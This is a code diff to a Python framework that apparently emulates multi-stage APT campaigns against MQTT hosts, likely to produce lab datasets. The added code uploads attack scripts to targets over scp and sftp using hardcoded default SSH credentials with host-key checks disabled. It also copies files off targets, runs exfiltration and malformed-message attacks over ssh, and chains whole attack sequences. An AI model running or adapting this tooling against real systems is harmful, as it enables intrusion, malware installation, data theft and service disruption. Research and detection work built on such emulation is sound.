@@ -7,19 +7,25 @@ import time
 import copy
 from datetime import datetime
 from enum import Enum
-from queue import Queue
-import pytz
 from abc import ABC, abstractmethod
+from queue import Queue
+import paramiko
+import pytz
 import ssh_auto_access as ssh
 from typing import Optional, List, Dict, Tuple, Literal
+
+
+def show_progress(transferred_bytes: int, total_bytes: int) -> None:
+    print(f"Transfer progress: {transferred_bytes}/{total_bytes}", flush=True)
 
 
 class APTPhase(Enum):
     """Enum representing APT phases"""
     RECONNAISSANCE = 1,
     BRUTE_FORCE = 2,
-    DISCOVERY = 3,
-    EXPLOIT = 4,
+    INSTALLATION = 3,
+    DISCOVERY = 4,
+    EXPLOIT = 5,
     PAUSE = -1
 
 
@@ -62,6 +68,83 @@ class APTStep(ABC):
             "command": self.get_step_name(),
             "iteration": iteration,
         }
+
+
+class InstStep(APTStep, ABC):
+    """Abstract Python class representing the step where the attacker installs malware on a target"""
+
+    def __init__(self, hostname: str, src_files: Optional[List[str]],
+                 dest_dir: str = "/home/ope", ssh_username: str = "ope", ssh_password: str = "maint",
+                 pause: float = 5.0):
+        super().__init__(hostname, pause)
+        if src_files is None:
+            self.src_files = ["/dollar_char_attack.py", "/empty_connection_dos.py", "/pub_exfiltration.py",
+                              "/qos_mid_dos.py", "/slash_char_attack.py", "/user_property_attack.py", "/zero_len_attack.py",
+                              "/mqtt_utilities.py"]
+        self.dest_dir = dest_dir
+        self.ssh_username = ssh_username
+        self.ssh_password = ssh_password
+
+    def get_phase(self) -> APTPhase:
+        return APTPhase.INSTALLATION
+
+    @abstractmethod
+    def install(self) -> None:
+        pass
+
+    def run_step(self, step_number: int, attack_name: str, iteration: int) -> List[Dict]:
+        start_time = datetime.now(tz=pytz.UTC)
+        print(f"Installing scripts with {self.get_step_name()} on {self.hostname}...")
+        self.install()
+        print(f"Completed installing exploit scripts on {self.hostname}")
+        result = self._build_results(step_number, attack_name, start_time, iteration)
+        time.sleep(random.random() * self.pause)
+        return [result]
+
+
+class ScpInstStep(InstStep):
+    """Python class implementing the installation of attack scripts on a target machine via scp"""
+
+    def __init__(self, hostname: str, src_files: Optional[List[str]], dest_dir: str = "/home/ope",
+                 ssh_username: str = "ope", ssh_password: str = "maint", pause: int = 5.0):
+        super().__init__(hostname, src_files, dest_dir, ssh_username, ssh_password, pause)
+
+    def get_step_name(self) -> str:
+        return "scp_inst"
+
+    def install(self) -> None:
+        cmd_files = " ".join(self.src_files)
+        os.system(
+            f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no -C {cmd_files} {self.ssh_username}@{self.hostname}:{self.dest_dir} | tee -a ./out.log')
+
+
+class SftpInstStep(InstStep):
+    """Python class implementing the installation of attack scripts on a target machine via sftp"""
+
+    def __init__(self, hostname: str, src_files: Optional[List[str]], dest_dir: str = "/home/ope",
+                 ssh_username: str = "ope", ssh_password: str = "maint", pause: int = 5.0):
+        super().__init__(hostname, src_files, dest_dir, ssh_username, ssh_password, pause)
+
+    def get_step_name(self) -> str:
+        return "sftp_inst"
+
+    def install(self) -> None:
+        ssh_client = paramiko.SSHClient()
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            ssh_client.connect(self.hostname, username=self.ssh_username, password=self.ssh_password)
+            print(f"Connected to {self.hostname} with ssh", flush=True)
+            sftp_client = paramiko.SFTPClient.from_transport(ssh_client.get_transport())
+            if sftp_client:
+                print(f"Connected to {self.hostname}'s sftp server", flush=True)
+            else:
+                print(f"Failed to connect to {self.hostname}'s sftp server", flush=True)
+            for src_file in self.src_files:
+                print(f"Beginning transfer of {src_file}...", flush=True)
+                sftp_client.put(src_file, self.dest_dir + src_file, callback=show_progress)
+                print(f"Completed transfer of {src_file}...", flush=True)
+        finally:
+            ssh_client.close()
 
 
 class PauseStep(APTStep):
@@ -294,18 +377,49 @@ class ScpExfiltrateStep(ExploitStep):
     """Exfiltrate data from a specified host to the local filesystem"""
 
     def __init__(self, hostname: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", src_file: str = "/to_be_exfiltrated", dest_file="./exfiltrated_data",
-                 timeout: float = 60, pause: float = 1):
+                 ssh_password: str = "maint", src_file: str = "/home/ope/to_be_exfiltrated", dest_file="./scp_exfiltrated_data",
+                 timeout: float = 0, pause: float = 1):
         super().__init__(hostname, None, None, ssh_username, ssh_password, timeout, pause)
         self.src_file = src_file
         self.dest_file = dest_file
 
     def get_step_name(self) -> str:
-        return "scp_exfiltrate"
+        return "scp_exf"
 
     def run_exploit(self) -> None:
         os.system(
-            f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no -r {self.ssh_username}@{self.hostname}:/{self.src_file} {self.dest_file} | tee -a ./out.log')
+            f'sshpass -p "{self.ssh_password}" scp -o StrictHostKeyChecking=no {self.ssh_username}@{self.hostname}:{self.src_file} {self.dest_file} | tee -a ./out.log')
+
+
+class SftpExfiltrateStep(ExploitStep):
+    """Exfiltrate data from a specified host using a preinstalled sftp server and the ssh credentials"""
+
+    def __init__(self, hostname: str, ssh_username: str = "ope", ssh_password: str = "maint",
+                 src_file: str = "/home/ope/to_be_exfiltrated", dest_file="./sftp_exfiltrated_data",
+                 timeout: float = 0, pause: float = 30):
+        super().__init__(hostname, None, None, ssh_username, ssh_password, timeout, pause)
+        self.src_file = src_file
+        self.dest_file = dest_file
+
+    def get_step_name(self) -> str:
+        return "sftp_exf"
+
+    def run_exploit(self) -> None:
+        ssh_client = paramiko.SSHClient()
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            ssh_client.connect(self.hostname, username=self.ssh_username, password=self.ssh_password)
+            print(f"Connected to {self.hostname} with ssh", flush=True)
+            sftp_client = paramiko.SFTPClient.from_transport(ssh_client.get_transport())
+            if sftp_client:
+                print(f"Connected to {self.hostname}'s sftp server", flush=True)
+            else:
+                print(f"Failed to connect to {self.hostname}'s sftp server", flush=True)
+                return
+
+            sftp_client.get(self.src_file, self.dest_file, callback=show_progress)
+        finally:
+            ssh_client.close()
 
 
 class DollarCharExploit(ExploitStep):
@@ -346,20 +460,20 @@ class PubExfExploit(ExploitStep):
     """Python class which implements the pub_exfiltration exploit"""
 
     def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, topics: List[str],
-                 ssh_username: str = "ope", ssh_password: str = "maint", duration: float = 10, pause: float = 1):
+                 ssh_username: str = "ope", ssh_password: str = "maint", exf_file: str = "/home/ope/to_be_exfiltrated",
+                 duration: float = 10, pause: float = 1):
         super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
         self.topics = topics
+        self.exf_file = exf_file
 
     def get_step_name(self) -> str:
         return "pub_exf"
 
     def run_exploit(self) -> None:
-        cmd_topics = ""
-        for topic in self.topics:
-            cmd_topics += f" {topic}"
+        cmd_topics = " ".join(self.topics)
         ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                          [
-                             f"python3 pub_exfiltration.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration} -t {cmd_topics}"],
+                             f"python3 pub_exfiltration.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration} -n {self.exf_file} -t {cmd_topics}"],
                          0, 0, "./out.log")
 
 
@@ -402,8 +516,9 @@ class UserPropExploit(ExploitStep):
     """Python class implementing the user_property_attack exploit"""
 
     def __init__(self, hostname: str, mqtt_username: str, mqtt_password: str, ssh_username: str = "ope",
-                 ssh_password: str = "maint", duration: float = 10, pause: float = 1):
+                 ssh_password: str = "maint", duration: float = 10, number: int = 20, pause: float = 1):
         super().__init__(hostname, mqtt_username, mqtt_password, ssh_username, ssh_password, duration, pause)
+        self.number = number
 
     def get_step_name(self) -> str:
         return "user_prop"
@@ -411,7 +526,7 @@ class UserPropExploit(ExploitStep):
     def run_exploit(self) -> None:
         ssh.ssh_commands(self.hostname, self.ssh_username, self.ssh_password,
                          [
-                             f"python3 user_property_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration}"],
+                             f"python3 user_property_attack.py -u {self.mqtt_username} -p {self.mqtt_password} -d {self.duration} -n {self.number}"],
                          0, 0, "./out.log")
 
 
@@ -496,8 +611,9 @@ class APTAttack:
         self.attack_name = attack_name
         self.exp_details = exp_details
         self.file_path_i = file_path_i
+        self.step_n = 0
 
-    def run(self, n_iterations: int = 1) -> List[Dict]:
+    def run(self, n_iterations: int = 1, starting_step_number: int = 1) -> List[Dict]:
         """
         Runs all steps of the APT attack and return the updated experiment details List.
 
@@ -505,6 +621,8 @@ class APTAttack:
         ----------
         n_iterations: int
             how many times the entire sequence of steps will be repeated
+        starting_step_number: int
+            number from which to start counting the steps of the attack
 
         Returns
         -------
@@ -513,25 +631,25 @@ class APTAttack:
         """
         try:
             for i in range(n_iterations):
-                step_number = 0
+                self.step_n = starting_step_number
                 for step in self.steps:
                     if len(step) < 2:
                         repetitions = 1
                     else:
                         repetitions = step[1]
                     for j in range(repetitions):
-                        list_exp_dict = step[0].run_step(step_number, self.attack_name, i)
+                        list_exp_dict = step[0].run_step(self.step_n, self.attack_name, i)
                         for exp in list_exp_dict:
                             if exp:
                                 self.exp_details.append(exp)
-                        step_number += 1
+                        self.step_n += 1
             return self.exp_details
         except KeyboardInterrupt:
             with open(self.file_path_i, "wb") as file:
                 pickle.dump(self.exp_details, file)
             return self.exp_details
 
-    def save_in(self, file_path: str = None):
+    def save_in(self, file_path: str = None) -> None:
         """
         Dumps the results of the attack to the specified file_path
 
@@ -544,3 +662,28 @@ class APTAttack:
             file_path = self.file_path_i
         with open(file_path, "wb") as file:
             pickle.dump(self.exp_details, file)
+
+    def get_step_n(self):
+        return self.step_n
+
+    def get_exp_details(self):
+        return self.exp_details
+
+
+class APTSequence:
+    """Chains and runs the APT attacks so their step number follow each other. They must share a same exp_details list of dicts"""
+
+    def __init__(self, attacks: List[Tuple[APTAttack, int]]):
+        self.attacks = attacks
+
+    def run_in_sequence(self) -> List[Dict]:
+        seq_step_n = 0
+        for attack_tuple in self.attacks:
+            if len(attack_tuple) < 2:
+                n_it = 1
+            else:
+                n_it = attack_tuple[1]
+            attack_tuple[0].run(n_it, seq_step_n)
+            seq_step_n = attack_tuple[0].get_step_n()
+            attack_tuple[0].save_in()
+        return self.attacks[-1][0].get_exp_details()
